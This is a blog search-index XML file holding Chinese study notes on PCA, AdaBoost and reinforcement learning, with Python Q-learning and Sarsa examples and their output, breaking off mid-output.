<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Moving on</title>
    <link href="/2020/10/12/Moving-on/"/>
    <url>/2020/10/12/Moving-on/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.b3ale.cn/" target="_blank" rel="noopener">New blog address</a></p><a id="more"></a><p>换博客，转战jekyll。</p>]]></content>
    
    
    
    <tags>
      
      <tag>life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Feature Extraction and Selection</title>
    <link href="/2020/07/23/Feature-Extraction-and-Selection/"/>
    <url>/2020/07/23/Feature-Extraction-and-Selection/</url>
    
    <content type="html"><![CDATA[<p>特征提取与特征选择。</p><a id="more"></a><h1 id="Feature-Extraction-and-Selection"><a href="#Feature-Extraction-and-Selection" class="headerlink" title="Feature Extraction and Selection"></a>Feature Extraction and Selection</h1><p>特征提取问题：</p><p>有一串向量，$\{x_1,x_2,\cdots,x_p\}$，其中 $x_i=\{x_{i1},x_{i2},\cdots,x_{xN}\}$，每一个 $x_i$ 属于 $C_1$ 或 $C_2$。如果构造一个降维函数 $\{f_1(x_{i1}\sim x_{iN}),f_2(x_{i1}\sim x_{iN}),\cdots,f_M(x_{i1}\sim x_{iN})\}$，使其保留最大的可分类信息？</p><p>特征选择问题：</p><p>有一串向量，$x_1,x_2,\cdots,x_p$，其中 $x_i=\{x_{i1},x_{i2},\cdots,x_{xN}\}$，每一个 $x_i$ 属于 $C_1$ 或 $C_2$。$N$ 个维度有冗余，如何从 $N$ 个维度中选取 $M$ 个维度（$M≤N$），使得识别率最高？</p><h2 id="主成分分析（Principle-Component-Analysis）"><a href="#主成分分析（Principle-Component-Analysis）" class="headerlink" title="主成分分析（Principle Component Analysis）"></a>主成分分析（Principle Component Analysis）</h2><p>主成分分析由卡尔·皮尔逊于 1901 年发明，用于分析数据及建立数理模型。</p><p>构造一个 $A$、$b$，使 $Y=Ax+b$，其中 $Y$ 是一个 Mx1 的矩阵，$X$ 是一个 Nx1 的矩阵，$A$ 是一个 MxN 的矩阵，$b$ 是一个 Mx1 的矩阵。即将 $X$ 由 N 维降至 M 维。故主成分分析可以看成是一个一层的有 M 个神经元的神经网络，且其中 $x$ 是没有标签（Label）的，和自编码器类似。</p><p>PCA 的做法：寻找使方差最大的方向，并在该方向上投影。最大限度地保存了训练样本的能量。</p><p><img src="/pics/Feature-Extraction-and-Selection/1.png" srcset="/img/loading.gif" alt></p><p>$$<br>\begin{cases}<br>Y=A(x-\bar{x}) &amp; b=-A\bar{x}\\<br>\bar{x}=E(x)=\frac{1}{P}\sum_{p=1}^Px_p &amp; \bar{x} 为x的均值<br>\end{cases}<br>$$</p><p>在 $Y=A(x-\bar{x})$ 中，$Y$ 是一个 Mx1 的矩阵，$A$ 是一个 MxN 的矩阵，$x$ 和 $\bar{x}$ 都是 Nx1 的矩阵。将 $A$ 写成行向量的形式，其中每个 $a_i$ 代表一个投影的方向：</p><p>$$<br>A=\begin{bmatrix}<br>a_1\\<br>a_2\\<br>\vdots\\<br>a_n<br>\end{bmatrix}<br>$$</p><p>那么 $Y$ 可以写成如下形式：</p><p>$$<br>Y_i=\begin{bmatrix}<br>a_1(x_i-\bar{x})\\<br>a_2(x_i-\bar{x})\\<br>\vdots\\<br>a_n(x_i-\bar{x})<br>\end{bmatrix}<br>=\begin{bmatrix}<br>y_{i1}\\<br>y_{i2}\\<br>\vdots\\<br>y_{iM}<br>\end{bmatrix}<br>(i=1\sim P)<br>$$</p><p>假设训练样本 $\{x_i\}<em>{i=1\sim P}$。计算 $\bar{y</em>{i1}}$ 的值如下：</p><p>$$<br>\begin{array}{l}<br>\bar{y_{i1}}=\frac{1}{P}\sum_{i=1}^Py_{i1}\\<br>\quad =\frac{1}{P}\sum_{i=1}^Pa_1(x_i-\bar{x})\\<br>\quad =\frac{a_1}{P}(\sum_{i=1}^Px_i-P\bar{x})=0<br>\end{array}<br>$$</p><p>最大化（其中 $\Sigma$ 是协方差矩阵）：</p><p>$$<br>\begin{array}{l}<br>\sum_{i=1}^P(y_{i1}-\bar{y_{i1}})^2=\sum_{i=1}^Py_{i1}^2\\<br>\quad\quad\quad\quad\quad\quad =\sum_{i=1}^P[a_1(x_i-\bar{x})]^2\\<br>\quad\quad\quad\quad\quad\quad =\sum_{i=1}^P[a_1(x_i-\bar{x})][a_1(x_i-\bar{x})]^T\\<br>\quad\quad\quad\quad\quad\quad =\sum_{i=1}^Pa_1[(x_i-\bar{x})(x_i-\bar{x})^T]a_1^T\\<br>\quad\quad\quad\quad\quad\quad =a_1[\sum_{i=1}^P(x_i-\bar{x})(x_i-\bar{x})^T]a_1^T\\<br>\quad\quad\quad\quad\quad\quad =a_1\Sigma a_1^T &amp; (\Sigma=\sum_{i=1}^P(x_i-\bar{x})(x_i-\bar{x})^T<br>\end{array}<br>$$</p><p>最终得到最大化优化问题如下：</p><ul><li>最大化：$a_1\Sigma a_1^T$</li><li>限制条件：$a_1a_1^T=\lVert a_1\rVert^2=1$</li></ul><p>拉格朗日乘子法：</p><p>$$<br>\begin{array}{l}<br>E(a_1)=a_1\Sigma a_1^T-\lambda(a_1a_1^T-1)\\<br>\frac{\partial E}{\partial a_1}=(\Sigma a_1^T-\lambda a_1^T)^T=0<br>\end{array}<br>$$</p><p>因此：</p><p>$$<br>\begin{array}{l}<br>\Sigma a_1^T=\lambda a_1^T &amp; （a_1^T是\Sigma的特征向量，\lambda是\Sigma的特征值）\\<br>a_1(\Sigma a_1^T)=a_1(\lambda a_1^T)=\lambda(a_1a_1^T)=\lambda<br>\end{array}<br>$$</p><p>故可以得出 $\lambda$ 是 $\Sigma$ 最大的特征值，$a_1$ 是 $\Sigma$ 最大特征值对应的特征向量，且 $a_1a_1^T=1$。</p><p>改造优化问题：</p><ul><li>最大化：$a_2\Sigma a_2^T$</li><li>限制条件：<ul><li>$a_2a_2^T=\lVert a_2\rVert^2=1$；</li><li>$a_2a_1^T=a^1a_2^T=0$，即 $a_1$ 与 $a_2$ 正交。</li></ul></li></ul><p>拉格朗日乘子法：</p><p>$$<br>\begin{array}{l}<br>E(a_2)=a_2\Sigma a_2^T-\lambda(a_2a_2^T)-\beta a_1a_2^T\\<br>\frac{\partial E}{\partial a_2}=(\Sigma a_2^T-\lambda a_2^T-\beta a_1^T)^T=0\\<br>\Sigma a_2^T-\lambda a_2^T-\beta a_1^T=0<br>\end{array}<br>$$</p><p>证明 $\beta=0$：</p><p>$$<br>\begin{array}{cc}<br>(\Sigma a_2^T-\lambda a_2^T-\beta a_1^T)^T=0\\<br>a_2\Sigma^T-\lambda a_2-\beta a_1=0<br>\end{array}<br>$$</p><p>因为 $\Sigma$ 是一个对称阵，即 $\Sigma=\Sigma^T$，得到：</p><p>$$<br>\begin{array}{cc}<br>a_2\Sigma-\lambda a_2-\beta a_1=0\\<br>a_2(\Sigma a_1^T)-\lambda(a_2a_1^T)-\beta a_1a_1^T=0\\<br>a_2\lambda_1a_1^T-0-\beta=0\\<br>\lambda_1 a_2a_1^T-\beta=0\\<br>\beta=0<br>\end{array}<br>$$</p><p>由于 $\beta=0$，故有：</p><p>$$<br>\begin{cases}<br>\Sigma a_2^T=\lambda a_2^T\\<br>a_2a_2^T=1\\<br>a_2\Sigma a_2^T=\lambda<br>\end{cases}<br>$$</p><p>所以 $a_2$ 是 $\Sigma$ 的特征向量，$\lambda$ 是 $\Sigma$ 的第二大的特征值。以此类推，同理可以得到 $a_3$ 是 $\Sigma$ 第三大特征值特征向量；$a_4$ ……；$a_5$ ……</p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>PCA 算法总结如下：</p><ol><li>求协方差矩阵：$\Sigma=\sum_{i=1}^P(x_i-\bar{x})(x_i-\bar{x})^T$；</li><li>求协方差矩阵 $\Sigma$ 的特征值，并从大到小排序：$[\lambda_1,\lambda_2,\cdots,\lambda_M,\lambda_{M+1},\cdots]$，对应的特征向量：$[a_1^T,a_2^T,\cdots,a_M^T,a_{M+1}^T,\cdots]$；</li><li>归一化所有 $a_i$，使 $a_ia_i^T=1$；</li><li>$A=\begin{bmatrix}a_1\\ a_2\\ \cdots\\ a_M\end{bmatrix}$；</li><li>降维：$Y_i=A(x_i-\bar{x})$，其中 $(i=1\sim P)$。</li></ol><blockquote><p>相关：SVD（Singular Value Decomposition）</p></blockquote><h2 id="自适应提升算法（AdaBoost）"><a href="#自适应提升算法（AdaBoost）" class="headerlink" title="自适应提升算法（AdaBoost）"></a>自适应提升算法（AdaBoost）</h2><p>自适应增强是一种机器学习方法，由 Yoav Freund 和 Robert Schapire 于 1995 年提出。</p><p>特征选择：$x=\begin{bmatrix}x_1\\ x_2\\ \cdots\\ x_N\end{bmatrix}$，从 N 个特征中选 M 个使识别率最高。共有 $C_N^M=\frac{N!}{M!(N-M)!}$ 种选法。启发式方法：</p><ol><li>递增法；</li><li>递减法。</li></ol><p>数据集 $T=\{(x_1,y_1),\cdots,(x_N,y_N)\}$，二分类问题：$y_i=\{-1,+1\}$。AdaBoost 算法流程：</p><ul><li>输入：$T=\{(x_i,y_i)\}_{i=1\sim N}$；</li><li>输出：分类器 $G(x)=±1$。</li></ul><ol><li>初始化采样权值：$D_1=(\omega_{11},\omega_{12},\omega_{13},\cdots,\omega_{1N})$，且 $\omega_{1i}=\frac{1}{N}$，其中 $i=1\sim N$；</li><li>对 $m=1,2,\cdots,M$（$M$ 是弱分类器个数），用 $D_M$ 采样 $N$ 个训练样本，在训练样本上获得弱分类器 $G_m(x)=±1$；</li><li>计算加权错误率：$\begin{array}{l}e_m=P(G_m(x_i)≠y_i)=\sum_{i=1}^N\omega_{m_i}I(G_m(x_i)≠y_i) &amp; e_m&lt;\frac{1}{2}\end{array}$，识别器 $G_m(x_i)$ 的权重为 $\begin{array}{l}\alpha_m=\frac{1}{2}\log\frac{1-e_m}{e_m} &amp; \alpha_m&gt;0\end{array}$；</li><li>更新权值分布：$D_{m+1}=\{\omega_{m+1,1},\omega{m+1,2},\cdots,\omega_{m+1,N}\}$，其中 $\begin{cases}\omega_{m+1,i}=\frac{\omega_{mi}}{Z_m}e^{-\alpha_my_iG_m(x_i)}\\ Z_m=\sum_{i=1}^N\omega_{mi}e^{-\alpha_my_iG_m(x_i)}\end{cases}$；</li><li>回到 2；</li><li>定义 $f(x)=\sum_{m=1}^M\alpha_mG_m(x)$，得到最终识别器 $G(x)=sign(f(x))=sign[\sum_{m=1}^M\alpha_mG_m(x)]$。</li></ol><p>定理：随着 $M$ 增加，AdaBoost 最终的分类器 $G(x)$ 在训练样本上的错误将会越来越小。</p><ul><li>错误率：$\begin{array}{l}E=\frac{1}{N}\sum_{i=1}^NI(G(x_i)≠y_i)≤\frac{1}{N}\sum_{i=1}^Ne^{-y_if(x_i)}\\ \quad=\Pi_{m=1}^MZ_m\end{array}$；</li><li>$\begin{array}{l}E≤\frac{1}{N}\sum_{i=1}^Ne^{-\sum_{m=1}^M\alpha_my_iG_m(x_i)}\\ \quad=\sum_{i=1}^N\omega_{1i}\Pi_{m=1}^Me^{-\alpha_my_iG_m(x_i)}\\ \quad=\sum_{i=1}^M[\omega_{1i}e^{-\alpha_1y_iG_1(x_i)}][\Pi_{m=2}^Me^{-\alpha_my_iG_m(x_i)}]\\ \quad=\sum_{i=1}^M[\omega_{2i}Z_i][\Pi_{m=2}^Me^{-\alpha_my_iG_m(x_i)}]\\ \quad=Z_1\sum_{i=1}^M\omega_{2i}[\Pi_{m=2}^Me^{-\alpha_my_iG_m(x_i)}]\\ \quad=\Pi_{m=1}^MZ_m\end{array}$</li></ul><p>证明：$Z_m=2\sqrt{e_m(1-e_m)}$</p><p>$$<br>\begin{array}{l}<br>Z_m=\sum_{i=1}^N\omega_{mi}e^{-\alpha_my_iG_m(x_i)}\\<br>\quad=\sum_{i=1\And y_i=G_m(x_i)}^N\omega_{mi}e^{-\alpha_m}+\sum_{i=1\And y_i≠G_m(x_i)}^N\omega_{mi}e^{\alpha_m}\\<br>\quad=(1-e_m)e^{-\alpha_m}+e_me^{\alpha_m}<br>\end{array}<br>$$</p><p>将 $\alpha_m=\frac{1}{2}\log\frac{1-e_m}{e_m}$ 代入，得：</p><p>$$<br>Z_m≤2\sqrt{e_m(1-e_m)}<br>$$</p><p>若 $e_m&lt;\frac{1}{2}$，则 $Z_m&lt;1$。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>浙江大学信电学院《机器学习》课程</p>]]></content>
    
    
    
    <tags>
      
      <tag>ml</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Reiforcement Learning</title>
    <link href="/2020/07/20/%5BTODO%5DReiforcement-Learning/"/>
    <url>/2020/07/20/%5BTODO%5DReiforcement-Learning/</url>
    
    <content type="html"><![CDATA[<p>无监督的强化学习。</p><a id="more"></a><h1 id="强化学习与监督学习的区别"><a href="#强化学习与监督学习的区别" class="headerlink" title="强化学习与监督学习的区别"></a>强化学习与监督学习的区别</h1><ol><li>训练数据中没有标签，只有奖励函数（Reward Function）；</li><li>训练数据不是现成给定的，而是由行为（Action）获得；</li><li>现在的行为（Action）不仅影响后续训练数据的获得，也影响奖励函数（Reward Function）的取值；</li><li>训练的目的是构建一个“状态-&gt;行为”的函数，其中状态（State）描述了目前内部和外部的环境，在此情况下，要使一个智能体（Agent）在某个特定的状态下，通过这个函数决定此时应该采取的行为。希望采取这些行为后，最终获得最大的奖励函数值。</li></ol><h2 id="强化学习相关算法"><a href="#强化学习相关算法" class="headerlink" title="强化学习相关算法"></a>强化学习相关算法</h2><ul><li>通过价值选行为（Model-Free）；<ul><li>Q learning（基于价值）</li><li>Sarsa（基于价值）</li><li>Deep Q Network</li></ul></li><li>直接选行为；<ul><li>Policy Gradients（基于概率）</li></ul></li><li>想象环境并从中学习。<ul><li>Model based RL</li></ul></li></ul><h1 id="Q-Learning"><a href="#Q-Learning" class="headerlink" title="Q Learning"></a><a href="https://blog.csdn.net/qq_30615903/article/details/80739243" target="_blank" rel="noopener">Q Learning</a></h1><p>Q Learning 是强化学习算法中基于价值的算法。</p><p>$$<br>\begin{array}{l}<br>Initialize\ Q(s,a)\ arbitrarily\\<br>Repeat\ (for\ each\ episode):\\<br>\quad Initialize\ S\\<br>\quad Repeat\ (for\ each\ step\ of\ episode):\\<br>\quad\quad Choose\ A\ from\ S\ using\ policy\ derived\ from\ Q\ (e.g.,\varepsilon-greedy)\\<br>\quad\quad Take\ action\ A,\ observe E,\ S’\\<br>\quad\quad Q(S,A)\leftarrow Q(S,A)+\alpha[R+\gamma\max_aQ(S’,a)-Q(S,A)]\\<br>\quad\quad S\leftarrow S’;\\<br>\quad until\ S\ is\ terminal<br>\end{array}<br>$$</p><h2 id="马尔可夫假设"><a href="#马尔可夫假设" class="headerlink" title="马尔可夫假设"></a>马尔可夫假设</h2><p>假设状态数有限，行为数有限：</p><ul><li>$R_t$：$t$ 时刻的奖励函数值；</li><li>$S_t$：$t$ 时刻的状态；</li><li>$A_t$：$t$ 时刻的行为。</li><li>下一时刻的状态只与当前时刻状态有关，与其他状态无关：$\mathbb{P}[S_{t+1}\vert S_t]=\mathbb{P}[S_{t+1}\vert S_1,\cdots,S_t]$；</li><li>下一个时刻的状态只与这一时刻的状态以及这一时刻的行为有关：$P_{ss’}^a=\mathbb{P}[S_{t+1}=s’\vert S_t=s,A_t=a]$；</li><li>下一时刻的奖励函数值只与这一时刻的状态及这一时刻的行为有关：$R_s^a=\mathbb{E}[R_{t+1}\vert S_t=s,A_t=a]$。</li></ul><h2 id="Markov-Decision-Process（MDP）"><a href="#Markov-Decision-Process（MDP）" class="headerlink" title="Markov Decision Process（MDP）"></a>Markov Decision Process（MDP）</h2><ol><li>在 $t=0$ 的时候，环境给出一个初始状态 $s_0\sim p(s_0)$；</li><li>需要学习一个策略（Policy）$\pi^*$，这是一个从状态到行为的映射函数，使得最大化累积的奖励。<ul><li>智能体选择行为 $a_t$；</li><li>环境采样奖励函数 $r_t\sim E(r_t\vert s_t,a_t)$；</li><li>环境产生下一个状态 $s_{t+1}\sim P(s_{t+1}\vert s_t,a_t)$；</li><li>智能体获得奖励函数 $r_t$ 和下一个状态 $s_{t+1}$。</li></ul></li></ol><h2 id="待优化目标函数"><a href="#待优化目标函数" class="headerlink" title="待优化目标函数"></a>待优化目标函数</h2><p>增强学习中的待优化目标函数是累计奖励，即一段时间内的奖励函数加权平均值（$\gamma$ 是一个衰减项，$0&lt;\gamma&lt;1$）：</p><p>$$<br>G_t=R_{t+1}+\gamma R_{t+2}+\cdots=\sum_{k=0}^\infty\gamma^kR_{t+k+1}<br>$$</p><p>需要学习的函数只有 $\pi^*$，即一个状态-&gt;行为的映射：</p><p>$$<br>\pi(s_t,a_t)=p(a_t\vert s_t)<br>$$</p><p>根据一个决策机制（Policy），可以获得一条路径：</p><p>$$<br>s_0,a_0,r_0,s_1,a_1,r_1,\cdots<br>$$</p><p>估值函数（Value Function）是衡量某个状态最终能获得多少累计奖励的函数：</p><p>$$<br>V^\pi(s)=\mathbb{E}[\sum_{t=0}^{+\infty}\gamma^tr_t\vert s_0=s,\pi]<br>$$</p><p>Q 函数是衡量某个状态下采取某个行为后，最终能获得多少积累奖励的函数：</p><p>$$<br>Q^\pi(s,a)=\mathbb{E}[\sum_{t=0}^{+\infty}\gamma^tr_t\vert s_0=s,a_0=a,\pi]<br>$$</p><p>有以下公式：</p><p>$$<br>\begin{array}{cc}<br>\pi(s,a)=p(a\vert s)\\<br>Q^\pi(s,a)=\sum_{S’\in S}P_{SS’}^a(R_S^a+\gamma V^\pi(S’))\\<br>\pi(S,a)=\begin{cases}1, &amp; 若a=\max_{a\in A}\ Q(S,a)\\ 2, &amp;其他\end{cases}<br>\end{array}<br>$$</p><p>得出估值函数和 Q 函数之间的关系：</p><p>$$<br>\begin{array}{l}<br>V^\pi(s)=E_\pi(\sum_{t=0}^{+\infty}\gamma^tr_t\vert s_0=s,\pi)\\<br>\quad\quad=E_\pi(r_0+\gamma\sum_{t=0}^{+\infty}\gamma^tr_{t+1}\vert s_0=s,\pi)\\<br>\quad\quad=\sum_{a\in A}\pi(s,a)\sum_{s’\in s}P_{ss’}^a(R_s^a+\gamma V^\pi(s’))\\<br>\quad\quad=\sum_{a\in A}p(a\vert s)Q^\pi(s,a)<br>\end{array}<br>$$</p><p>即：</p><p>$$<br>V^\pi(s)=\sum_{a\in A}\pi(s,a)Q^\pi(s,a)<br>$$</p><p>通过上式，并使用迭代的方式每次对 Q 值（$\pi(s,a)$，即在状态 $s$ 下执行动作 $a$ 的概率）进行更新，最终可以求出最佳策略 $\pi$。</p><h2 id="Shortcomings"><a href="#Shortcomings" class="headerlink" title="Shortcomings"></a>Shortcomings</h2><p>对于状态数和行为数很多的时候，这种做法不现实。</p><h2 id="Programming"><a href="#Programming" class="headerlink" title="Programming"></a>Programming</h2><p>下面模拟一下 Q Learning 的学习过程：</p><pre><code class="python">#!/usr/bin/env python3import numpy as npimport pandas as pdimport timeimport sysif len(sys.argv) == 2 and sys.argv[1] == &#39;SET_SEED&#39;:    seed = int(input(&#39;Input seed: &#39;))    np.random.seed(seed)NSTATES = 6ACTIONS = [&#39;left&#39;, &#39;right&#39;]EPSILON = 0.9 # greedy policyALPHA = 0.1 # learning rateLAMBDA = 0.9 # discount factorMAX_EPSODES = 13FRESH_TIME = 0.01def buildQTable(nStates, actions): # 创建Q表    table = pd.DataFrame(        np.zeros((nStates, len(actions))),        columns=actions, # 纵坐标为Actions    )    print(table)    return tabledef chooseAction(state, qTable): # 随机选择Action    stateActions = qTable.iloc[state, :]    if np.random.rand() &gt; EPSILON or stateActions.all() == False: # 命中了10%的概率或是表中所有Actions的值都为0，随机选择下一个Action        actionName = np.random.choice(ACTIONS)    else: # 反之取值最大的Action作为下一个选择        actionName = stateActions.idxmax()    return actionNamedef getEnvFeedback(S, A): # 通过当前状态和行为获取下一状态和奖励函数值    if A == &#39;right&#39;: # 如果Action为向右走        if S == NSTATES - 2: # 如果当前状态在目的地左侧1个位置            S_ = &#39;terminate&#39; # 下一个状态设为终止            R = 1 # 奖励函数值设为1        else:            S_ = S + 1 # 下一状态设为当前状态+1            R = 0 # 奖励函数值为0    else: # 如果Action为向左走        R = 0 # 向左走不会到目的地，奖励函数值设为0        if S == 0: # 如果已经在最左侧            S_ = S # 下一状态不变        else:            S_ = S - 1 # 下一状态设为当前状态-1    return S_, Rdef updateEnv(S, episode, stepCounter): # 更新环境    envList = [&#39;-&#39;] * (NSTATES - 1) + [&#39;T&#39;] # 初始化环境    if S == &#39;terminate&#39;: # 如果状态为终止        interaction = &#39;Episode %s: total_steps = %s&#39; % (episode + 1, stepCounter)        print(&#39;\r{}&#39;.format(interaction))        time.sleep(0.5)    else:        envList[S] = &#39;M&#39; # 更新当前位置        interaction = &#39;&#39;.join(envList)        print(&#39;\r{}&#39;.format(interaction), end=&#39;&#39;)        time.sleep(FRESH_TIME)def rl(): # 增强学习训练函数    qTable = buildQTable(NSTATES, ACTIONS) # 创建Q表    for episode in range(MAX_EPSODES): # 循环训练        stepCounter = 0        S = 0        isTerminated = False        updateEnv(S, episode, stepCounter) # 初始化环境        while not isTerminated:            A = chooseAction(S, qTable) # 选择Action            S_, R = getEnvFeedback(S, A) # 获取下一个状态和当前奖励函数值            qPred = qTable.loc[S, A] # 获取预测的Q值            if S_ != &#39;terminate&#39;: # 如果没有到达目的地                qTarget = R + LAMBDA * qTable.iloc[S_, :].max() # 计算实际的Q值            else:                qTarget = R                isTerminated = True            qTable.loc[S, A] += ALPHA * (qTarget - qPred) # 更新Q值            S = S_ # 更新当前状态            updateEnv(S, episode, stepCounter + 1) # 更新环境            stepCounter += 1    return qTableif __name__ == &#39;__main__&#39;:    qTable = rl()    print(qTable)</code></pre><p>因为存在贪婪系数（Greedy Policy），在实际测试时可能有 10% 的概率随机选择行为，导致最后的结果有一些浮动：</p><pre><code class="bash">$ ./Q-Learning-1.py   left  right0   0.0    0.01   0.0    0.02   0.0    0.03   0.0    0.04   0.0    0.05   0.0    0.0Episode 1: total_steps = 34Episode 2: total_steps = 7Episode 3: total_steps = 7Episode 4: total_steps = 5Episode 5: total_steps = 6Episode 6: total_steps = 8Episode 7: total_steps = 7Episode 8: total_steps = 5Episode 9: total_steps = 5Episode 10: total_steps = 5Episode 11: total_steps = 5Episode 12: total_steps = 5Episode 13: total_steps = 5       left     right0  0.000002  0.0052131  0.000026  0.0271332  0.000139  0.1117243  0.000139  0.3433314  0.000810  0.7458135  0.000000  0.000000</code></pre><h2 id="Off-policy"><a href="#Off-policy" class="headerlink" title="Off-policy"></a>Off-policy</h2><p>Q Learning 是典型的 Off-policy 算法，其生成样本的 Policy（Value Function）跟网络更新参数时使用的 Policy（Value Function）不同，计算下一状态的预期收益时通过 MAX 函数直接选择最优动作，而当前 Policy 并不一定能选择到最优动作。先产生某概率分布下的大量行为数据（Behavior Policy），意在探索。从这些偏离（Off）最优策略的数据中寻求 Target Policy。</p><p>劣势是曲折，收敛慢，但优势是确保了数据全面性，所有行为都能覆盖。</p><h1 id="Sarsa"><a href="#Sarsa" class="headerlink" title="Sarsa"></a><a href="https://zhuanlan.zhihu.com/p/29283927" target="_blank" rel="noopener">Sarsa</a></h1><p>Sarsa 算法和 Q Learning 很像，也是基于 Q 表实现。</p><p>$$<br>\begin{array}{l}<br>Initialize\ Q(s,a)\ arbitrarily\\<br>Repeat\ (for\ each\ episode):\\<br>\quad Initialize\ S\\<br>\quad Choose\ A\ from\ S\ using\ policy\ derived\ from\ Q\ (e.g.,\varepsilon-greedy)\\<br>\quad Repeat\ (for\ each\ step\ of\ episode):\\<br>\quad\quad Take\ action\ A,\ observe\ E,\ S’\\<br>\quad\quad Choose\ A’\ from\ S’\ using\ policy\ derived\ from\ Q\ (e.g.,\varepsilon-greedy)\\<br>\quad\quad Q(S,A)\leftarrow Q(S,A)+\alpha[R+\gamma Q(S’,A’)-Q(S,A)]\\<br>\quad\quad S\leftarrow S’;\ A\leftarrow A’;\\<br>\quad until\ S\ is\ terminal<br>\end{array}<br>$$</p><p>在更新 Q 表的时候，Sarsa 选择的策略与上一个策略一样，执行完当前行为 Action 后，再更新 Q 值。</p><h2 id="Programming-1"><a href="#Programming-1" class="headerlink" title="Programming"></a>Programming</h2><p>测试由 tkinter 库实现的走迷宫小程序，使用 Sarsa 算法在避开陷阱的同时找到最优路径：</p><pre><code class="python">#!/usr/bin/env python3import numpy as npimport pandas as pdimport tkinter as tkimport timeUNIT = 40 # pixelsMAZE_H = 4 # grid heightMAZE_W = 4 # grid widthclass Maze(tk.Tk, object): # 环境类    def __init__(self):        super(Maze, self).__init__()        self.actionSpace = [&#39;up&#39;, &#39;down&#39;, &#39;left&#39;, &#39;right&#39;]        self.nActions = len(self.actionSpace)        self.title(&#39;maze&#39;)        self.geometry(&#39;{0}x{1}&#39;.format(MAZE_H * UNIT, MAZE_W * UNIT))        self.buildMaze()    def buildMaze(self):        self.canvas = tk.Canvas(self, bg=&#39;white&#39;, height=MAZE_H * UNIT, width=MAZE_W * UNIT)        for c in range(0, MAZE_W * UNIT, UNIT):            x0, y0, x1, y1 = c, 0, c, MAZE_H * UNIT            self.canvas.create_line(x0, y0, x1, y1)        for r in range(0, MAZE_H * UNIT, UNIT):            x0, y0, x1, y1 = 0, r, MAZE_W * UNIT, r            self.canvas.create_line(x0, y0, x1, y1)        origin = np.array([20, 20])        # hell        hell1Center = origin + np.array([UNIT * 2, UNIT])        self.hell1 = self.canvas.create_rectangle(hell1Center[0] - 15, hell1Center[1] - 15, hell1Center[0] + 15, hell1Center[1] + 15, fill=&#39;black&#39;)        # hell        hell2Center = origin + np.array([UNIT, UNIT * 2])        self.hell2 = self.canvas.create_rectangle(hell2Center[0] - 15, hell2Center[1] - 15, hell2Center[0] + 15, hell2Center[1] + 15, fill=&#39;black&#39;)        # oval        ovalCenter = origin + UNIT * 2        self.oval = self.canvas.create_rectangle(ovalCenter[0] - 15, ovalCenter[1] - 15, ovalCenter[0] + 15, ovalCenter[1] + 15, fill=&#39;yellow&#39;)        # rect        self.rect = self.canvas.create_rectangle(origin[0] - 15, origin[1] - 15, origin[0] + 15, origin[1] + 15, fill=&#39;red&#39;)        self.canvas.pack()    def reset(self):        self.update()        time.sleep(0.5)        self.canvas.delete(self.rect)        origin = np.array([20, 20])        self.rect = self.canvas.create_rectangle(origin[0] - 15, origin[0] - 15, origin[0] + 15, origin[0] + 15, fill=&#39;red&#39;)        return self.canvas.coords(self.rect)    def step(self, action):        s = self.canvas.coords(self.rect)        baseAction = np.array([0, 0])        if action == 0:            if s[1] &gt; UNIT:                baseAction[1] -= UNIT        elif action == 1:            if s[1] &lt; (MAZE_H - 1) * UNIT:                baseAction[1] += UNIT        elif action == 2:            if s[0] &lt; (MAZE_W - 1) * UNIT:                baseAction[0] += UNIT        elif action == 3:            if s[0] &gt; UNIT:                baseAction[0] -= UNIT        self.canvas.move(self.rect, baseAction[0], baseAction[1])        s_ = self.canvas.coords(self.rect)        if s_ == self.canvas.coords(self.oval):            reward = 1            isDone = True            s_ = &#39;terminated&#39;        elif s_ in [self.canvas.coords(self.hell1), self.canvas.coords(self.hell2)]:            reward = -1            isDone = True            s_ = &#39;terminated&#39;        else:            reward = 0            isDone = False        return s_, reward, isDone    def render(self):        time.sleep(0.1)        self.update()class RL(object): # 增强学习类    def __init__(self, actions, learningRate=0.01, rewardDecay=0.9, greedyPolicy=0.9):        self.actions = actions        self.lr = learningRate # 学习率        self.gamma = rewardDecay # 衰减项        self.epsilon = greedyPolicy # 贪婪系数        self.qTable = pd.DataFrame(columns=self.actions, dtype=np.float64)    def checkStateExists(self, state): # 检查状态State是否存在        if state not in self.qTable.index:            self.qTable = self.qTable.append(pd.Series([0] * len(self.actions), index=self.qTable.columns, name=state))    def chooseAction(self, observation): # 选择行为Action        self.checkStateExists(observation)        if np.random.rand() &lt; self.epsilon:            stateAction = self.qTable.loc[observation, :]            action = np.random.choice(stateAction[stateAction == np.max(stateAction)].index) # 选择Q值最大的行为Action        else: # 10%的概率随机选择行为Action            action = np.random.choice(self.actions)        return action    def learn(self, *args): # 学习函数        passclass SarsaTable(RL):    def __init__(self, actions, learningRate=0.01, rewardDecay=0.9, greedyPolicy=0.9):        super(SarsaTable, self).__init__(actions, learningRate, rewardDecay, greedyPolicy)    def learn(self, s, a, r, s_, a_):        self.checkStateExists(s_) # 检测得到的下一个状态State是否存在        qPred = self.qTable.loc[s, a]        if s_ != &#39;terminated&#39;: # 如果没有终止            qTarget = r + self.gamma * self.qTable.loc[s_, a_] # 计算新的Q值        else: # 状态终止            qTarget = r        self.qTable.loc[s, a] += self.lr * (qTarget - qPred) # 更新Q值def update(): # 更新环境函数    for episode in range(100):        stepCounter = 0        state = env.reset() # 获取初始状态        action = RL.chooseAction(str(state)) # 获取初始行为        while True:            env.render() # 更新环境            state_, reward, isDone = env.step(action) # 执行当前行为并获取下一状态            action_ = RL.chooseAction(str(state_)) # 选择下一个行为Action            RL.learn(str(state), action, reward, str(state_), action_) # 学习并更新Q表            state = state_ # 更新下一个状态State            action = action_ # 更新下一个行为Action            stepCounter += 1            if isDone:                break        if reward == 1:            print(&#39;[+] Success! Episode %s: total_steps = %s&#39; % (episode + 1, stepCounter))        elif reward == -1:            print(&#39;[!] Failed... Episode %s: total_steps = %s&#39; % (episode + 1, stepCounter))    print(&#39;[*] Done&#39;)    env.destroy()if __name__ == &#39;__main__&#39;:    env = Maze()    RL = SarsaTable(actions=list(range(env.nActions)))    env.after(100, update)    env.mainloop()</code></pre><p>学习效果：</p><pre><code class="bash">$ $ ./Sarsa.py[!] Failed... Episode 1: total_steps = 7[!] Failed... Episode 2: total_steps = 11[!] Failed... Episode 3: total_steps = 